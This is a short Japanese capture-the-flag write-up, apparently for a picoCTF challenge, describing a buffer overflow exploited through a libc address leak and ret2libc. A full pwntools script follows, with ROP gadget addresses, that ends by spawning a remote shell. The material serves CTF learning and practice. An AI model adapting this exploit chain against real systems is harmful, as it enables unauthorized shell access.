## tl;dr

BOF, libc leak, ret2libc

## 解法

入力からリターンアドレスまでの offset は 136 文字です。ここからは、いつものやつです。もう 5 回くらいこの解法を見たことがあります。

1. `puts(puts@GOT)` で `puts` の アドレスリーク
2. `puts` のアドレスから libc 内部の `puts` の offset を引いて libc base リーク
3. `main` に飛ばしてもう一度 ROP
4. libc 内の "/bin/sh" の文字列を利用して `system("/bin/sh")`

い　つ　も　の

実　家　の　よ　う　な　安　心　感

親　の　顔　よ　り　見　た　解　法

```python
from pwn import *
elf=context.binary=ELF("./vuln")
libc=ELF("./libc")
#p=process("./vuln")
p=remote("mercury.picoctf.net",42072)

payload=b"A"*136
#payload+=p64(0x0040052e) # ret
payload+=p64(0x00400913) # pop rdi
payload+=p64(elf.got['puts'])
payload+=p64(elf.plt['puts'])
payload+=p64(elf.symbols['main'])

p.sendline(payload)
p.recvline()
p.recvline()
addr=u64(p.recv(6).ljust(8,b"\x00"))
print(hex(addr))
libc_base=addr-libc.symbols['puts']
print(hex(libc_base))

payload=b"A"*136
payload+=p64(0x0040052e) # ret
payload+=p64(0x00400913) # pop rdi
payload+=p64(libc_base+next(libc.search(b"/bin/sh")))
payload+=p64(libc_base+libc.symbols['system'])
p.sendline(payload)
p.interactive()
```